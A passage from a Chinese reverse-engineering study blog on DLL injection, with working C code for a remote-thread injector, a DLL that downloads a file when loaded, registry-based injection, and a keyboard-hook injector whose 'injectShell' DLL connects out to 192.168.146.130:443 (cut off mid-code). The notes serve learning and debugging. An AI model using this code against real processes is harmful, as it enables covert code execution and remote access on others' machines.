<span class="literal">NULL</span>, (PDWORD) <span class="literal">NULL</span>) </span><br></pre></td></tr></table></figure><p>如期执行函数则可以提升OpenProcessToken返回的access token的相关权限</p><h3 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h3><ul><li>利用OpenProcessToken，返回一个能访问目标进程并且具备提升权限的access token</li><li>LookupPrivilegeValue，返回一个具备指定权限的LUID（local unique identifier）</li><li>设置结构体TOKEN_PRIVILEGES</li><li>AdjustTokenPrivileges，利用上述步骤完成的参数铺垫设置，完成权限提升</li></ul>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.7--DLL注入</title>
      <link href="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h2><p>通过对实例的展示，理解DLL注入的技术过程</p><blockquote><p>从技术细节上来说，DLL注入命令其他进程自行调用LoadLibrary()API，加载用户指定的DLL文件（LoadLibrary参数）</p><p>注入后的DLL获得访问被注入进程内存空间的正当访问权限，可以左右程序运行逻辑</p></blockquote><p>DLL注入的三种实现方法：</p><ul><li>创建远程线程（CreateRemoteThead() API）</li><li>使用注册表（AppInit_DLLs值）</li><li>消息钩取（SetWindowsHookEx() API）</li></ul><p>DLL特性，<strong>在被加载时会启动DllMain()函数</strong>，利用该特性可修复程序或个程序添加新功能。</p><h3 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h3><p>该方案在目标进程内开启线程设置线程的回调函数完成DLL注入</p><p>示例用到的：InjeckDll.exe作为注入器，而myHack.dll中的DllMain中进行字符串输出用于检测DLL注入随后在被注入进程中开启线程完成对回调函数ThreadProc的调用实现下载网页的效果。这一切都是在DLL被注入时自动调用DllMain完成的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Inject.exe-main源码</span></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);<span class="comment">//设置目标进程以及要注入的dll所在路径</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// change privilege</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">SetPrivilege</span>(SE_DEBUG_NAME, TRUE) )</span><br><span class="line">        <span class="comment">//后续操作中有需要特权才能进行的操作，比如Inject方法的VirtualAllocEx，在目标进程中开辟空间写入参数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject dll</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">InjectDll</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]) )</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//完成参数个数判断</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Inject.exe-Inject函数源码</span></span><br><span class="line">BOOL <span class="title function_">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. dwPID 判断获取的进程id</span></span><br><span class="line">    <span class="keyword">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #2. 在目标程序中开辟内存空间分配给将要注入的dll所在的路径字符串使用</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #3. 写入dll文件的路径</span></span><br><span class="line">    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #4. LoadLibraryA() API 地址获取</span></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #5. notepad.exe 在notepad.exe中开启线程</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//myhack.dll </span></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;urlmon.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_URL     (<span class="string">L&quot;http://www.naver.com/index.html&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_FILE_NAME   (<span class="string">L&quot;index.html&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">HMODULE g_hMod = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    TCHAR szPath[_MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    TCHAR *p = _tcsrchr( szPath, <span class="string">&#x27;\\&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span>( !p )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    _tcscpy_s(p+<span class="number">1</span>, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line"></span><br><span class="line">    URLDownloadToFile(<span class="literal">NULL</span>, DEF_URL, szPath, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    g_hMod = (HMODULE)hinstDLL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">        OutputDebugString(<span class="string">L&quot;&lt;myhack.dll&gt; Injection!!!&quot;</span>);</span><br><span class="line">        <span class="comment">//在被注入进程开启线程执行回调函数ThreadProc</span></span><br><span class="line">        hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        CloseHandle(hThread);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="梳理下流程："><a href="#梳理下流程：" class="headerlink" title="梳理下流程："></a>梳理下流程：</h4><ul><li><p>Inject.exe在判断传入的参数个数是否满足，满足 -&gt; 调用Inject()</p></li><li><p>在Inject.dll里，会利用OpenProcess先行判断传递的pid是否有效，返回句柄hProcess</p></li><li><p>借有main函数中提升的特权，利用VirtualAllocEx在目标进程开辟一段空间，后续使用，返回开辟的空间首地址</p></li><li><p>调用WriteProcessMemory将dll绝对路径字符串进行写入。</p></li><li><p>获取Kernel.LoadLibraryW的API地址，参数（已写入的待注入Dll完整路径）为先前写入目标进程开辟出的空间</p></li><li><p>在使用CreateRemoteThread在进程中开启线程将该函数的回调函数参数设置成LoadLibraryW并填充相应的参数完成dll的载入</p></li><li><p>当DLL注入成功，会调用inject.dll -&gt; DllMain，一下部分是在DllMain自动完成的：</p><blockquote><p>fdwReason &#x3D; DLL_PROCESS_ATTACH，输出注入成功的字符串。在Inject.exe中开辟线程CreateThread，在创建的线程内执行dll.ThreadProc函数。</p><p>由于g_hMod指向的是dll文件自身，在dll.ThreadProc内部调用GetModuleFileName查找dll文件的绝对路径，存放在szPath中，在经过路径的字符切分，最后调用URLDownloadToFile，传入路径与下载资源的位置，即将远程资源下载到和dll文件同目录下。</p></blockquote></li></ul><hr><h4 id="调试部分"><a href="#调试部分" class="headerlink" title="调试部分"></a>调试部分</h4><p>经过上述分析，大概调试思路也有了：使用OD打开notepad.exe，F9让notepad.exe开始运行，再打开DebuggingOptions中的载入新模块时中断，在用Injeck.exe传入notepad.exe的pid以及myhack.dll的路径，回车，OD停在myhack.dll模块的（Injeck.exe需要给管理员权限）</p><p>OD载入notepad.exe并F9执行</p><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/1.png" class=""><p>打开OD的DebuggingOptions -&gt; 在新模块载入时中断：</p><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/2.png" class=""><p>管理员权限给终端在启动Inject.exe，并设置参数</p><p>pid：</p><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/3.png" class=""><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/4.png" class=""><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/4.png" class=""><p>OD停在myhack.dll的位置，进入myhack.dll的区域：</p><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/6.png" class=""><h4 id="myhack-dll部分"><a href="#myhack-dll部分" class="headerlink" title="myhack.dll部分"></a>myhack.dll部分</h4><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/7.png" class=""><p>此处对应源码中如下的部分，完成的功能是验证所给Injeck.exe的参数notepad.exe的pid以及待注入myhack.dll的路径是否正确</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/8.png" class=""><p>完成的是对应源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">DWORD WINAPI <span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    TCHAR *p = _tcsrchr( szPath, <span class="string">&#x27;\\&#x27;</span> );<span class="comment">//szPath = .../myhack.dll</span></span><br><span class="line">    <span class="keyword">if</span>( !p )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>截取dll文件的绝对路径将最后一个斜杆后边的内容截断取前面部分，位置后下载的网页文件做保存路径的拼接</p><figure class="highlight plaintext"><figcaption><span>eax, eax```影响标志位，判断eax值是否为0，若配合je jne等于0 fiag相关的跳转指令可完成条件判断。这里eax来自于_tcsrchr查找字符串的结果返回值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;% asset_img 8.png %&#125;</span><br><span class="line"></span><br><span class="line">完成路径拼接，这里保存的路径适合dll文件同目录下的.../index.heml</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line">//...</span><br><span class="line">DWORD WINAPI ThreadProc(LPVOID lParam)</span><br><span class="line">&#123;</span><br><span class="line">//...</span><br><span class="line">    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);</span><br><span class="line">//...</span><br><span class="line">&#125;</span><br><span class="line">//...</span><br></pre></td></tr></table></figure><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/10.png" class=""><p>完成文件的下载</p><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/11.png" class=""><hr><h3 id="注册表字段注入"><a href="#注册表字段注入" class="headerlink" title="注册表字段注入"></a>注册表字段注入</h3><blockquote><p>Windows操作系统的注册表中默认提供了AppInit_DLLs与LoadAppinit_DLLs两个注册表项，将要注入的DLL文件路径写入AppInit_DLLs项目中，再将Load_AppInit_DLLs设置为1，重启后，DLL会注入所有运行进程。</p><p>原理是：User32.dll被加载到进程后，会读取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() API加载用户DLL，严格上来说，用户DLL文件并不会被加载到所有进程，只是加载到加载了user32.dll的那些进程。ps：windows XP会忽略LoadAppInit_DLLs注册表项。</p><p>注册表项路径：HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls</p></blockquote><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/12.png" class=""><img src="/2022/05/03/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-7-DLL%E6%B3%A8%E5%85%A5/13.png" class=""><h3 id="SetWindowsHookEx方法"><a href="#SetWindowsHookEx方法" class="headerlink" title="SetWindowsHookEx方法"></a>SetWindowsHookEx方法</h3><p>和前边方法一差不多，也是通过设置SetWindowsHookEx的回调函数并设置相应参数即可，相信经过上边第一个例子以及上一篇文章<a href="https://cvjark.github.io/2022/04/23/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-6-Windows-Hook/">《逆核系列No.6–Windows Hook》</a>，不难理解如下利用SetWindowsHookEx完成DLL注入的代码（<a href="https://ha.cker.in/Article/6931">code source</a>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//injector.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Loads inject.dll into the address space of the calling function, in this case the running exe</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HMODULE dll = LoadLibrary(<span class="string">&quot;inject.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(dll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot find DLL&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gets the address of the inject method in the inject.dll</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, <span class="string">&quot;inject&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot find the function&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Places a hook in the hookchain for WH_KEYBOARD type events, using the address for the inject method, with the library address</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    HHOOK handle = SetWindowsHookEx(WH_KEYBOARD, addr, dll, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Couldn&#x27;t hook the keyboard&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hooked the program, hit enter to exit&quot;</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    UnhookWindowsHookEx(handle);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//injectShell.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">INT APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hDll, DWORD Reason, LPVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    fopen_s(&amp;file, <span class="string">&quot;C:\temp.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(Reason)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;DLL attach function called.n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;DLL detach function called.n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;DLL thread attach function called.n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;DLL thread detach function called.n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">inject</span><span class="params">(<span class="type">int</span> code, WPARAM wParam, LPARAM lParam)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    SOCKET s;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">server</span>;</span></span><br><span class="line">    <span class="type">char</span> *message;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nInitializing Winsock...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>),&amp;wsa) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed. Error Code : %d&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span>(CallNextHookEx(<span class="literal">NULL</span>, code, wParam, lParam));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initialized. \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span> )) == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not create socket : %d&quot;</span>, WSAGetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Socket Created. \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    server.sin_addr.s_addr = inet_addr(<span class="string">&quot;192.168.146.130&quot;</span>); <span class="comment">//ip address</span></span><br><span class="line">    server.sin_family = AF_INET;</span><br><span class="line">    server.sin_port = htons( <span class="number">443</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;server, <span class="keyword">sizeof</span>(server)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span 